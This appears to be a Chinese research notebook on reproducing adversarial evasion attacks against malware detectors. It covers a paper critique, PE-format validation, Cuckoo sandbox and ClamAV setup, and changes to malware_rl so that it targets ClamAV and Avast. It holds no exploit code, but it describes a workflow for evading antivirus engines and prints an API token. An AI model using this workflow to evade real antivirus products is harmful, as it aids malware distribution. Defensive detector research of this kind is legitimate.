<h4 id="2-2-2-Cons"><a href="#2-2-2-Cons" class="headerlink" title="2.2.2 Cons"></a>2.2.2 Cons</h4><ul>
<li>并未说明选择攻击的理由是什么</li>
<li>排列组合已有的对抗性攻击生成器并不新颖</li>
<li>对商业杀毒软件的实验，并没有将商业杀毒软件作为直接的攻击对象，而是使用以及生成的样本进行检测</li>
<li>攻击的设计混乱：黑盒白盒均有且比较时同时比较，不同生成器攻击的检测器也不同</li>
<li>并未对生成的样本进行<strong>保持性检测</strong></li>
</ul>
<h4 id="2-2-3-Argue"><a href="#2-2-3-Argue" class="headerlink" title="2.2.3 Argue"></a>2.2.3 Argue</h4><ul>
<li><strong>数据集的代表性和多样性：</strong>使用更大且多样化的数据集，涵盖更多类型的恶意软件和更多种类的杀毒程序，以验证结果的广泛适用性。</li>
<li><strong>对抗性样本的功能性：</strong>在评估对抗性样本时，不仅要考虑其规避检测的能力，还应评估其功能性和可用性。</li>
</ul>
<h2 id="3-实验用到的工具"><a href="#3-实验用到的工具" class="headerlink" title="3.  实验用到的工具"></a>3.  实验用到的工具</h2><h3 id="3-1-Cuckoo-Sandbox"><a href="#3-1-Cuckoo-Sandbox" class="headerlink" title="3.1 Cuckoo Sandbox"></a>3.1 Cuckoo Sandbox</h3><p>Cuckoo 是一个开源的自动恶意软件分析系统。</p>
<p>它可以检索以下类型的结果：</p>
<ul>
<li><p>恶意软件生成的所有进程执行的调用痕迹。</p>
</li>
<li><p>恶意软件在执行期间创建、删除和下载的文件。</p>
</li>
<li><p>恶意软件进程的内存转储。</p>
</li>
<li><p>PCAP格式的网络流量跟踪。</p>
</li>
<li><p>在执行恶意软件期间拍摄的屏幕截图。</p>
</li>
<li><p>机器的全内存转储。</p>
</li>
</ul>
<blockquote>
<p>虽然推荐的设置是GNU&#x2F;Linux（最好是Debian或Ubuntu），但Cuckoo也已证明在Mac OS X和Microsoft Windows 7上作为主机运行得很顺畅。推荐和测试的客机设置是Windows分析使用Windows XP和64位Windows 7，Mac OS X分析使用Mac OS X Yosemite，Linux分析使用Debian，尽管Cuckoo也应该可以在其他版本的客操作系统上工作。不要使用Windows Linux子系统（WLS）来运行Cuckoo Sandbox。</p>
</blockquote>
<h2 id="4-过程记录"><a href="#4-过程记录" class="headerlink" title="4. 过程记录"></a>4. 过程记录</h2><h3 id="4-1-如何判断一个PE文件格式合法"><a href="#4-1-如何判断一个PE文件格式合法" class="headerlink" title="4.1 如何判断一个PE文件格式合法"></a>4.1 如何判断一个PE文件格式合法</h3><p>使用pefile库作为工具</p>
<ol>
<li><code>DOS_HEADER</code>：	<ul>
<li>检查<code>DOS_HEADER.e_magic</code> 字段是否为<code>MZ</code></li>
</ul>
</li>
<li><code>IMAGE_NT_HEADER</code>: 包含文件头<code>FILE_HEADER</code>和可选头<code>OPTIONAL_HEADER</code><ul>
<li>文件头<code>FILE_HEADER</code>:<ul>
<li>检查文件头<code>FILE_HEADER</code>是否以<code>PE\0\0</code>开始</li>
<li>从可选头<code>OPTIONAL_HEADER</code>中获取文件的物理信息，例如<code>SizeOfImage</code>、<code>SizeOfCode</code></li>
</ul>
</li>
<li>可选头<code>OPTIONAL_HEADER</code><ul>
<li>检查<code>pe.OPTIONAL_HEADER.Magic</code>是否为<code>0x10B or 0x20B</code></li>
<li>检查<code>pe.OPTIONAL_HEADER.DATA_DIRECTORY</code>，确定虚拟地址是否在节中</li>
</ul>
</li>
</ul>
</li>
<li><code>SECTIONS</code>：<ul>
<li>节名称检查</li>
<li>节大小检查</li>
<li>节虚拟地址对齐检查</li>
<li>节原始数据指针对齐检查</li>
<li>实际节数量和<code>pe.FILE_HEADER.NumberOfSections</code>是否相等</li>
<li>检查实际section数量与<code>pe.FILE_HEADER.NumberOfSections</code>的值是否相等</li>
</ul>
</li>
<li><del>检查PE文件在磁盘上的实际大小和预期大小是否相同</del>（暂时不用这个作为判断PE格式的规则）<ul>
<li>预期大小：<code>expected_size = pe.OPTIONAL_HEADER.SizeOfHeaders + sum(section.SizeOfRawData for section in pe.sections)</code>、实际大小<code>len(pe.__data__)</code></li>
</ul>
</li>
<li>引入函数节<code>.idata</code><ul>
<li>检查 <code>IMAGE_IMPORT_DESCRIPTOR</code> 结构的数量是否与实际<code>DLL</code>的数量相对应</li>
</ul>
</li>
<li>导出函数节<code>.edata</code><ul>
<li>检查<code>NumberOfFunctions</code>是否和实际导出函数的数量相等</li>
</ul>
</li>
</ol>
<h3 id="4-2-使用-cuckoo-Sandbox-检查是否可执行和保持恶意功能"><a href="#4-2-使用-cuckoo-Sandbox-检查是否可执行和保持恶意功能" class="headerlink" title="4.2 使用 cuckoo Sandbox 检查是否可执行和保持恶意功能"></a>4.2 使用 cuckoo Sandbox 检查是否可执行和保持恶意功能</h3><p><del>卡住了，安装不了。现在打算试一下用<code>Hybrid analysis</code>这个工具</del></p>
<p>2024.8.24终于安装好了</p>
<p><code>sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/tcpdump </code>解决下面的问题</p>
<blockquote>
<p>2020-12-22 16:31:25,236 [cuckoo.core.plugins] ERROR: Unable to stop auxiliary module: Sniffer Traceback (most recent call last): File “&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python2.7&#x2F;dist-packages&#x2F;cuckoo&#x2F;core&#x2F;plugins.py”, line 164, in stop module.stop() File “&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python2.7&#x2F;dist-packages&#x2F;cuckoo&#x2F;auxiliary&#x2F;sniffer.py”, line 156, in stop (out, err, faq(“permission-denied-for-tcpdump”)) CuckooOperationalError: Error running tcpdump to sniff the network traffic during the analysis; stdout &#x3D; ‘’ and stderr &#x3D; ‘tcpdump: vboxnet0: That device is not up\n’. Did you enable the extra capabilities to allow running tcpdump as non-root user and disable AppArmor properly (the latter only applies to Ubuntu-based distributions with AppArmor, see also <a target="_blank" rel="noopener" href="https://cuckoo.sh/docs/faq/index.html#permission-denied-for-tcpdump">https://cuckoo.sh/docs/faq/index.html#permission-denied-for-tcpdump</a>)?</p>
</blockquote>
<h4 id="网页使用教程："><a href="#网页使用教程：" class="headerlink" title="网页使用教程："></a>网页使用教程：</h4><p>首先启动 mongoDB</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start mongod <span class="comment"># 启动 MongoDB 服务</span></span><br><span class="line">sudo systemctl status mongod <span class="comment"># 验证 MongoDB 服务状态</span></span><br></pre></td></tr></table></figure>

<p>在第一个终端窗口运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cuckoo -d</span><br></pre></td></tr></table></figure>

<p>在第二个终端运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cuckoo web runserver</span><br></pre></td></tr></table></figure>

<p>访问<code>127.0.0.1:8000</code>，并提交病毒样本</p>
<h4 id="如何自动化提交样本到本地cuckoo并获取分析结果"><a href="#如何自动化提交样本到本地cuckoo并获取分析结果" class="headerlink" title="如何自动化提交样本到本地cuckoo并获取分析结果"></a>如何自动化提交样本到本地cuckoo并获取分析结果</h4><p>使用<code>cuckoo -d</code>开启<code>cuckoo</code>守护进程</p>
<p>使用<code>cuckoo api -H 127.0.0.1 -p 8000</code> 在本地的<code>127.0.0.1:8000</code>开启<code>api</code></p>
<p>然后通过下面的代码发送到cuckoo沙盒中解析，<code>api_token</code>在<code>.cuckoo/conf/cuckoo.conf</code>中获取。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HEADERS = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer CNM8W4QnTABkVtke0fcx5Q&quot;</span>&#125;  <span class="comment"># 使用你的 api_token</span></span><br><span class="line"></span><br><span class="line">submit_url = <span class="string">&quot;http://localhost:8000/tasks/create/file&quot;</span></span><br><span class="line"></span><br><span class="line">  data = &#123;<span class="string">&#x27;timeout&#x27;</span>: <span class="string">&#x27;30&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">      <span class="keyword">with</span> <span class="built_in">open</span>(sample, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sample_file:</span><br><span class="line">          files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;new_mutation&quot;</span>, sample_file)&#125;</span><br><span class="line">          r = requests.post(submit_url, data=data, files=files, headers=HEADERS) </span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">f&quot;File successfully submitted for analysis: <span class="subst">&#123;sample&#125;</span>&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span> r.json()</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">f&quot;Error code: <span class="subst">&#123;r.status_code&#125;</span> returned when submitting.&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span> r.status_code</span><br></pre></td></tr></table></figure>

<p>通过上面返回的<code>r.json</code>得到task_id，然后使用下面的代码获取报告</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_report_local_sandbox</span>(<span class="params">task_id, report_type=<span class="string">&#x27;report&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Fetches a report from Cuckoo Sandbox based on the task_id.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Input:</span></span><br><span class="line"><span class="string">        task_id: The ID of the task to fetch the report for</span></span><br><span class="line"><span class="string">        report_type: The type of report to fetch (&#x27;report&#x27; or &#x27;view&#x27;)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    report_url = <span class="string">f&quot;http://localhost:8000/tasks/<span class="subst">&#123;report_type&#125;</span>/<span class="subst">&#123;task_id&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(report_url, headers=HEADERS)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> r.json()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Failed to fetch report. Status code: <span class="subst">&#123;r.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;An error occurred while fetching the report: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>



<h4 id="安装教程："><a href="#安装教程：" class="headerlink" title="安装教程："></a>安装教程：</h4><p>参考的博客：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://utopianknight.com/malware/cuckoo-installation-on-ubuntu-20/">https://utopianknight.com/malware/cuckoo-installation-on-ubuntu-20/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BenjaminNL/p/11139517.html">https://www.cnblogs.com/BenjaminNL/p/11139517.html</a></li>
</ul>
<p>配置的环境为嵌套虚拟：</p>
<p>主机macOS 虚拟机 parallel desktop，⚠️<strong>我使用的是花钱升级后的parallel desktop，好像普通版的没有这个功能。当然我认为使用virtualbox也是可以的，你可以试一试</strong></p>
<p>parallel desktop 安装的是 ubuntu 22.04 jammy 版本， ubuntu中安装的是virtual box虚拟机系统为windows xp</p>
<p>跟随<a target="_blank" rel="noopener" href="https://utopianknight.com/malware/cuckoo-installation-on-ubuntu-20/%E4%B8%80%E8%87%B4%E5%AE%89%E8%A3%85%E5%88%B0step">https://utopianknight.com/malware/cuckoo-installation-on-ubuntu-20/一致安装到step</a> 54。现在我们不安装windows 7，转去安装windows xp（因为我的虚拟机存储空间不够）。</p>
<p>注意，首先我们要修改parallel desktop的网络设置，配置shared（也就是NAT）如下图所示</p>
<p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-08-24%2016.44.42.png" alt="截屏2024-08-24 16.44.42"></p>
<p>接着手动设置ubuntu的网络设置如下，这是为了确保ubuntu能够使用parallel desktop提供的子网访问互联网：</p>
<p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-08-24%2016.45.45.png" alt="截屏2024-08-24 16.45.45"></p>
<p>现在我们跟随<a target="_blank" rel="noopener" href="https://www.cnblogs.com/BenjaminNL/p/11139517.html%E7%9A%842.3%E8%8A%82%E8%BF%9B%E8%A1%8C%E5%AE%A2%E6%88%B7%E6%9C%BA%E5%87%86%E5%A4%87%EF%BC%9A">https://www.cnblogs.com/BenjaminNL/p/11139517.html的2.3节进行客户机准备：</a></p>
<p>⚠️ 注意在配置windowsxp虚拟机网关和ubuntu网关时，要配制成你parallel desktop 的 shared 网络设定的网关，这一步可以问问chatgpt怎么查看网关，通常是通过ifconfig查看。</p>
<p>其余步骤相同，还需要注意的点有</p>
<p>⚠️ mongodb需要安装4.2或4.4版本，如何在ubuntu22.04上安装mongodb 4.0 如下所示：</p>
<blockquote>
<p>要在Ubuntu 22.04上安装MongoDB 4.2，你可以按照以下步骤操作：</p>
<h3 id="1-导入MongoDB-4-2的官方公钥"><a href="#1-导入MongoDB-4-2的官方公钥" class="headerlink" title="1. 导入MongoDB 4.2的官方公钥"></a>1. 导入MongoDB 4.2的官方公钥</h3><p>首先，你需要导入MongoDB的官方公钥，以确保安装包的安全性：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO - https://www.mongodb.org/static/pgp/server-4.2.asc | sudo apt-key add -</span><br></pre></td></tr></table></figure>

<h3 id="2-创建MongoDB-4-2的APT源列表文件"><a href="#2-创建MongoDB-4-2的APT源列表文件" class="headerlink" title="2. 创建MongoDB 4.2的APT源列表文件"></a>2. 创建MongoDB 4.2的APT源列表文件</h3><p>接下来，创建一个新的APT源列表文件，将MongoDB 4.2的源添加到系统中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.2 multiverse&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/mongodb-org-4.2.list</span><br></pre></td></tr></table></figure>

<p>注意：虽然你使用的是Ubuntu 22.04（Jammy），但MongoDB 4.2的官方APT源是为Ubuntu 18.04（Bionic）准备的。这个源在Ubuntu 22.04上也能正常工作。</p>
<h3 id="3-更新APT包数据库"><a href="#3-更新APT包数据库" class="headerlink" title="3. 更新APT包数据库"></a>3. 更新APT包数据库</h3><p>添加源后，更新你的APT包数据库：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<h3 id="4-安装MongoDB-4-2"><a href="#4-安装MongoDB-4-2" class="headerlink" title="4. 安装MongoDB 4.2"></a>4. 安装MongoDB 4.2</h3><p>现在你可以安装MongoDB 4.2：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y mongodb-org=4.2.23 mongodb-org-server=4.2.23 mongodb-org-shell=4.2.23 mongodb-org-mongos=4.2.23 mongodb-org-tools=4.2.23</span><br></pre></td></tr></table></figure>

<p>这里我们指定了版本号 <code>4.2.23</code>，你可以根据需要安装MongoDB 4.2的其他版本。</p>
<h3 id="5-固定MongoDB版本"><a href="#5-固定MongoDB版本" class="headerlink" title="5. 固定MongoDB版本"></a>5. 固定MongoDB版本</h3><p>为了防止意外升级MongoDB，你可以将这些包固定在当前版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org hold&quot;</span> | sudo dpkg --set-selections</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org-server hold&quot;</span> | sudo dpkg --set-selections</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org-shell hold&quot;</span> | sudo dpkg --set-selections</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org-mongos hold&quot;</span> | sudo dpkg --set-selections</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org-tools hold&quot;</span> | sudo dpkg --set-selections</span><br></pre></td></tr></table></figure>

<h3 id="6-启动MongoDB服务"><a href="#6-启动MongoDB服务" class="headerlink" title="6. 启动MongoDB服务"></a>6. 启动MongoDB服务</h3><p>安装完成后，你可以启动MongoDB服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start mongod</span><br></pre></td></tr></table></figure>

<h3 id="7-设置MongoDB服务开机自启"><a href="#7-设置MongoDB服务开机自启" class="headerlink" title="7. 设置MongoDB服务开机自启"></a>7. 设置MongoDB服务开机自启</h3><p>为了确保MongoDB在系统启动时自动启动，你可以启用服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> mongod</span><br></pre></td></tr></table></figure>

<h3 id="8-检查MongoDB服务状态"><a href="#8-检查MongoDB服务状态" class="headerlink" title="8. 检查MongoDB服务状态"></a>8. 检查MongoDB服务状态</h3><p>你可以通过以下命令检查MongoDB服务的状态，以确保它运行正常：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status mongod</span><br></pre></td></tr></table></figure>

<p>至此，你已经成功在Ubuntu 22.04上安装了MongoDB 4.2。</p>
</blockquote>
<p>⚠️ ubuntu22.04 的 tcpdump的路径已经从 &#x2F;sbin&#x2F; 变为 &#x2F;bin&#x2F;</p>
<p>⚠️ 2022-07-02 03:09:17,187 [cuckoo.core.guest] DEBUG: cuckoo2: not ready yet 问题</p>
<blockquote>
<p>2022-07-02 03:09:17,187 [cuckoo.core.guest] DEBUG: cuckoo2: not ready yet<br>这个问题基本都是因为cuckoo的客户机中重启的时候agent没有启动成功。或者是保存快照的时候没有成功设置好开机自动启动agent（我参照的两个链接中用了不同的方法，我采用的是官方的办法），或者就是没安装python导致启动失败（安装python2.7就解决了）。</p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40976667/article/details/125574007">https://blog.csdn.net/qq_40976667/article/details/125574007</a></p>
</blockquote>
<p>⚠️ </p>
<blockquote>
<p>≈ 你遇到的问题是由于 <code>m2crypto</code> 依赖于 OpenSSL 库的头文件和 SWIG，而当前的环境缺少这些头文件或不兼容的版本。要在 Python 2.7 上安装 <code>m2crypto==0.24.0</code>，可以尝试以下步骤：</p>
<h3 id="1-安装兼容的-OpenSSL-版本"><a href="#1-安装兼容的-OpenSSL-版本" class="headerlink" title="1. 安装兼容的 OpenSSL 版本"></a>1. 安装兼容的 OpenSSL 版本</h3><h3 id="重新编译-OpenSSL-以生成动态库"><a href="#重新编译-OpenSSL-以生成动态库" class="headerlink" title="重新编译 OpenSSL 以生成动态库"></a>重新编译 OpenSSL 以生成动态库</h3><ol>
<li><p>进入 OpenSSL 的源代码目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">cd /path/to/openssl-1.0.2u/</span><br></pre></td></tr></table></figure>
</li>
<li><p>清理之前的构建：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure>
</li>
<li><p>重新配置编译并生成动态库（<code>libssl.so</code> 和 <code>libcrypto.so</code>）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">./config --prefix=/usr/local/ssl shared</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<p>这里的 <code>shared</code> 选项将确保 OpenSSL 构建包含动态库。</p>
</li>
<li><p>验证是否生成了动态库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">ls /usr/local/ssl/lib/libcrypto.so</span><br><span class="line">ls /usr/local/ssl/lib/libssl.so</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="2-设置-OpenSSL-环境变量"><a href="#2-设置-OpenSSL-环境变量" class="headerlink" title="2. 设置 OpenSSL 环境变量"></a>2. 设置 OpenSSL 环境变量</h3><p>在编译和安装 <code>m2crypto</code> 时，需要确保使用正确的 OpenSSL 版本。你需要设置 <code>LDFLAGS</code> 和 <code>CPPFLAGS</code> 以指向你安装的 OpenSSL 路径。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LDFLAGS=<span class="string">&quot;-L/usr/local/ssl/lib&quot;</span></span><br><span class="line"><span class="built_in">export</span> CPPFLAGS=<span class="string">&quot;-I/usr/local/ssl/include&quot;</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;/usr/local/ssl/bin:<span class="variable">$PATH</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-安装-SWIG-3-x"><a href="#3-安装-SWIG-3-x" class="headerlink" title="3. 安装 SWIG 3.x"></a>3. 安装 SWIG 3.x</h3><p>你可能需要安装较旧的 SWIG 版本（如 3.x 系列），以确保与 Python 2.7 的兼容性：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove swig</span><br><span class="line">wget https://sourceforge.net/projects/swig/files/swig/swig-3.0.12/swig-3.0.12.tar.gz</span><br><span class="line">tar -xvf swig-3.0.12.tar.gz</span><br><span class="line"><span class="built_in">cd</span> swig-3.0.12</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h3 id="4-安装-m2crypto-0-24-0"><a href="#4-安装-m2crypto-0-24-0" class="headerlink" title="4. 安装 m2crypto==0.24.0"></a>4. 安装 <code>m2crypto==0.24.0</code></h3><ol>
<li><p>进入 <code>M2Crypto-0.24.0</code> 目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">cd ~/estimation_on_attacker/cuckoo_sandbox/M2Crypto-0.24.0/</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置环境变量，确保链接到正确的 OpenSSL 路径：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">export LDFLAGS=&quot;-L/usr/local/ssl/lib&quot;</span><br><span class="line">export CPPFLAGS=&quot;-I/usr/local/ssl/include&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行安装命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure></li>
</ol>
</blockquote>
<h3 id="4-3-ClamAV"><a href="#4-3-ClamAV" class="headerlink" title="4.3 ClamAV"></a>4.3 ClamAV</h3><p>完成的部分：</p>
<ul>
<li><p>首先使用<code>sudo clamd</code>启动<code>clamd</code>进程</p>
</li>
<li><p>然后使用<code>sudo clamdscan</code>扫描</p>
</li>
<li><p>已经安装并了解ClamAV的使用方法 clamdcan</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu-linux-22-04-02-desktop:~$ clamscan detector_repo/dateset_large_size/VirusShare_0b346b201da259377ba11438504bbd9e </span><br><span class="line">Loading:    14s, ETA:   0s [========================&gt;]    8.70M/8.70M sigs       </span><br><span class="line">Compiling:   5s, ETA:   0s [========================&gt;]       41/41 tasks </span><br><span class="line"></span><br><span class="line">/home/parallels/detector_repo/dateset_large_size/VirusShare_0b346b201da259377ba11438504bbd9e: Win.Trojan.Delf-2345 FOUND</span><br><span class="line"></span><br><span class="line">----------- SCAN SUMMARY -----------</span><br><span class="line">Known viruses: 8696388</span><br><span class="line">Engine version: 1.3.1</span><br><span class="line">Scanned directories: 0</span><br><span class="line">Scanned files: 1</span><br><span class="line">Infected files: 1</span><br><span class="line">Data scanned: 0.29 MB</span><br><span class="line">Data read: 0.19 MB (ratio 1.49:1)</span><br><span class="line">Time: 25.619 sec (0 m 25 s)</span><br><span class="line">Start Date: 2024:07:21 13:33:09</span><br><span class="line">End Date:   2024:07:21 13:33:34</span><br><span class="line">parallels@ubuntu-linux-22-04-02-des</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>sudo systemctl unmask clamav-daemon</code>解除对 <code>clamav-daemon.service</code> 的屏蔽状态</p>
</li>
<li><p><code>sudo systemctl start clamav-daemon</code>解除屏蔽之后，尝试启动 <code>clamav-daemon</code> 服务：</p>
</li>
<li><p><code>sudo systemctl status clamav-daemon</code>查看 <code>clamav-daemon</code> 是否已经启动成功</p>
</li>
</ul>
<p>计划：</p>
<ul>
<li>尝试将ClamAV集成到各个attacker的代码中</li>
</ul>
<h2 id="5-Attacker的实验复现记录"><a href="#5-Attacker的实验复现记录" class="headerlink" title="5. Attacker的实验复现记录"></a>5. Attacker的实验复现记录</h2><h3 id="5-1-malware-rl-实验复现"><a href="#5-1-malware-rl-实验复现" class="headerlink" title="5.1 malware_rl 实验复现"></a>5.1 malware_rl 实验复现</h3><p>我在代码中修改的部分：</p>
<ol>
<li>使用<code>get_vt_report.py</code>脚本获取样本的virustotals报告，然后使用<code>avclassfication</code>为其分类。</li>
<li>移除无法被lief正确加载的样本，通过<code>keep_valid_pefile.py</code>过滤</li>
<li>程序开始时，将文件夹中的文件用被攻击的检测器检测，删掉已经被标记为合法的文件</li>
<li>episode_count 初始值等于文件数量，即对每一个文件执行一个回合，每个回合的步数遵循源码，为50步，即MAXTURNS&#x3D;50。</li>
<li>成功逃逸的样本会从待选列表中删除</li>
<li>补充了对avast、clamav的攻击<ul>
<li>对clamav的实现方式为，调用虚拟机（本机）的clamd进程扫描样本</li>
<li>对avast的攻击实现方式为：使用ssh连接宿主机（远程机器），通过远程机器的avast scan扫描样本获取结果。（因为avast没有linux版本）</li>
</ul>
</li>
</ol>
